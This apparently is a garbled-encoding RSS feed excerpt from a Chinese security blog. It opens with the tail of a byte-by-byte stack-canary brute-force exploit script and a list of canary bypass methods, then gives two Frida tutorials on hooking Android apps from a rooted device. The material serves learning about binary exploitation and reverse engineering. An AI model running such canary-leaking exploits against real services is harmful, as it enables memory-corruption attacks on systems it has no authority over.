&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print &amp;#34;\t[+] Byte found 0x%02x&amp;#34; % i&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">255&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34;[-] Exploit failed&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">canary&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">stop&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;hex&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="s2">&amp;#34; [+] SSP value is 0x&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>canaryåŠ«æŒ__stack_chk_fail å‡½æ•°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¦†ç›– TLS ä¸­å‚¨å­˜çš„ Canary å€¼&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_2(å¾…è¡¥å……)</title><link>https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Sat, 02 Feb 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_2å¾…è¡¥å……">Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_2(å¾…è¡¥å……)&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>å¤ä¹ ä¸€ä¸‹Androidå®‰è£…fridaå‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">adb root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb push frida-server /data/local/tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb shell &lt;span class="s2">&amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb shell &lt;span class="s2">&amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¸¸ç”¨Frida å‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">frida-ps -U &lt;span class="c1">#åˆ—å‡ºUSBè®¾å¤‡è¿è¡Œingçš„è¿›ç¨‹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-ps -Ua &lt;span class="c1">#åˆ—å‡ºè¿è¡Œä¸­çš„åº”ç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-ps -Uai &lt;span class="c1">#åˆ—å‡ºå·²å®‰è£…çš„åº”ç”¨åˆ—è¡¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-ps -D xxx &lt;span class="c1">#è¿æ¥æŒ‡å®šçš„è®¾å¤‡&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-ps -R
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#åœ¨Safariä¸­è·Ÿè¸ªrecv*å’Œsend* API&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-trace -i &lt;span class="s2">&amp;#34;recv*&amp;#34;&lt;/span> -i &lt;span class="s2">&amp;#34;send&amp;#34;&lt;/span> Safari
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#åœ¨Safariä¸­è·Ÿè¸ªObjCæ–¹æ³•è°ƒç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-trace -m &lt;span class="s2">&amp;#34;-[NSView drawRect:]&amp;#34;&lt;/span> Safari
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#åœ¨iPhoneä¸Šå¯åŠ¨SnapChatï¼Œè·Ÿè¸ªåŠ å¯†APIè°ƒç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-trace -U -f com.app.testing -I &lt;span class="s2">&amp;#34;libcommonCrypto*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œfridaè·Ÿè¸ªæ‰€æœ‰open function&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">frida-trace -U -i open com.app.testing
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸‹é¢é€šè¿‡è‡ªå·±åˆ›å»ºä¸€ä¸ªAndroid APPæ¥å­¦ä¹ Fridaåœ¨Androidä¸Šçš„ä¸€èˆ¬ç”¨æ³•ã€‚&lt;/p>
&lt;h3 id="0x01-ç®€å•ç”¨ä¾‹">0x01 ç®€å•ç”¨ä¾‹&lt;/h3>
&lt;p>Fridaå¸¸ç”¨çš„ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š&lt;/p>
&lt;ol>
&lt;li>python ç»‘å®šå¯åŠ¨&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">frida&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>&lt;span class="o">,&lt;/span>&lt;span class="nn">os&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## package name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pkg_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;com.example.xxx&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">js_hook_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;xxx.js&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">on_message&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">message&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;send&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] &lt;/span>&lt;span class="si">{0}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;payload&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## æ’å…¥jsä»£ç  or åŠ è½½jsæ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">jscode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">script&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">process&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">frida&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get_usb_device&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">attach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pkg_name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">js_hook_file&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">script&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">create_script&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">script&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">on&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">on_message&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">script&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">load&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">console.log(&amp;#34;Script loaded successfully &amp;#34;);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Java.perform(function x() {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> //hookä»£ç 
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">});
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>ç›´æ¥å‘½ä»¤åŠ è½½è„šæœ¬å¯åŠ¨&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">frida -U -l xxx.js com.example.xxx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x02-appæºç ">0x02 Appæºç &lt;/h3>
&lt;p>javaå±‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>nativeå±‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x03-javaå±‚hook">0x03 Javaå±‚hook&lt;/h3>
&lt;p>HOOKä»£ç &lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x04-nativeå±‚hook">0x04 Nativeå±‚hook&lt;/h3>
&lt;p>nativeå±‚ä»£ç &lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x05-æ€»ç»“">0x05 æ€»ç»“&lt;/h3>
&lt;p>æºä»£ç åœ°å€ï¼š&lt;/p>
&lt;h3 id="0x06-å‚è€ƒ">0x06 å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.freebuf.com/articles/system/190565.html" target="_blank" rel="noopener"
>https://www.freebuf.com/articles/system/190565.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener"
>https://blog.csdn.net/jiangwei0910410003/article/details/80372118&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/dweinstein/awesome-frida" target="_blank" rel="noopener"
>https://github.com/dweinstein/awesome-frida&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_1ï¼ˆé‡ç½®ï¼‰</title><link>https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1%E9%87%8D%E7%BD%AE/</link><pubDate>Tue, 22 Jan 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1%E9%87%8D%E7%BD%AE/</guid><description>&lt;h1 id="fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_1é‡ç½®">Fridaä»å…¥é—¨åˆ°æ”¾å¼ƒ_1ï¼ˆé‡ç½®ï¼‰&lt;/h1>
&lt;h3 id="0x00-frida">0x00 Frida&lt;/h3>
&lt;p>Frida å®˜ç½‘ï¼šhttps://www.frida.re/&lt;/p>
&lt;p>github: &lt;a class="link" href="https://github.com/frida/frida" target="_blank" rel="noopener"
>https://github.com/frida/frida&lt;/a>&lt;/p>
&lt;p>Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Scriptable&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Portable&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Free&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Battle-tested&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-å®‰è£…">0x01 å®‰è£…&lt;/h3>
&lt;h3 id="äºŒè¿›åˆ¶å®‰è£…-æ¨è">äºŒè¿›åˆ¶å®‰è£… (æ¨è)&lt;/h3>
&lt;p>pip install frida-tools å°±ä¸€ä¸ªå‘½ä»¤æå®š&lt;/p>
&lt;blockquote>
&lt;p>Failed to load the Frida native extension: DLL load failed: æ‰¾ä¸åˆ°æŒ‡å®šçš„æ¨¡å—&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>æŠ¥äº†è¿™ä¸ªé”™ æŸ¥äº†å¤§åŠå¤© åŸæ¥æˆ‘ç”¨çš„ç‰ˆæœ¬æ˜¯åŸºäºpython3.7ç¼–è¯‘çš„ã€‚æˆ‘ç°åœ¨ç”¨çš„3.6.ã€‚ã€‚ã€‚ã€‚
&lt;/code>&lt;/pre>
&lt;p>ç»‘å®šï¼šäºŒé€‰ä¸€å°±è¡Œ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">pip install frida &lt;span class="c1"># Python bindings&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">npm install frida &lt;span class="c1"># Node.js bindings&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ‰‹åŠ¨ç¼–è¯‘">æ‰‹åŠ¨ç¼–è¯‘&lt;/h3>
&lt;p>ä¾èµ–ï¼š&lt;/p>
&lt;p>&lt;code>pip3 install colorama prompt-toolkit pygments&lt;/code>&lt;/p>
&lt;ul>
&lt;li>Linux&lt;/li>
&lt;/ul>
&lt;p>&lt;code>make&lt;/code>&lt;/p>
&lt;ul>
&lt;li>MacOS and iOS&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">MAC_CERTID&lt;/span>&lt;span class="o">=&lt;/span>frida-cert
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">IOS_CERTID&lt;/span>&lt;span class="o">=&lt;/span>frida-cert
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>Windows&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">frida.sln &lt;span class="c1">#VS2017&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="0x02-androidç¯å¢ƒ">0x02 Androidç¯å¢ƒ&lt;/h3>
&lt;p>è®¾å¤‡ï¼šå°ç±³mix2 è¿è¡ŒAndroid9.0 MIUI10å¼€å‘ç‰ˆå·²è§£é”root&lt;/p>
&lt;p>frida-server: ç”¨çš„arm64ç‰ˆæœ¬&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/frida/frida/releases" target="_blank" rel="noopener"
>serveræ–‡ä»¶ä¸‹è½½&lt;/a>&lt;/p>
&lt;p>ä¸‹è½½å¥½å¯¹åº”çš„ frida-server ç„¶åadb push è¿›å»&lt;/p>
&lt;p>&lt;code>adb push frida-server /data/local/tmp&lt;/code>&lt;/p>
&lt;p>ç„¶å&lt;code>chomd 755 frida-server&lt;/code>ä¿®æ”¹æƒé™&lt;/p>
&lt;p>è¿è¡Œ&lt;code>./frida-server&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190112133452.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>frida-server&lt;/p>
&lt;p>è¿™å‡ ä¸ªå‘½ä»¤ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">adb&lt;/span> &lt;span class="n">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">adb&lt;/span> &lt;span class="n">push&lt;/span> &lt;span class="nb">frida-server&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">tmp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">adb&lt;/span> &lt;span class="n">shell&lt;/span> &lt;span class="s2">&amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">adb&lt;/span> &lt;span class="n">shell&lt;/span> &lt;span class="s2">&amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æŸ¥çœ‹æ¶æ„ï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616145105.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>aarch64&lt;/p>
&lt;h3 id="0x03-ç®€å•æµ‹è¯•">0x03 ç®€å•æµ‹è¯•&lt;/h3>
&lt;p>å‘½ä»¤è¡Œè¿è¡Œ&lt;code>frida-ps -U&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190112133604.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>frida-ps&lt;/p>
&lt;p>æœ‰æ˜¾ç¤ºå°±æ˜¯è¿æ¥æˆåŠŸ&lt;/p>
&lt;p>æ¥ä¸‹æ¥å¯¹æµè§ˆå™¨è¿›è¡Œç®€å•æµ‹è¯•&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616150349.png"
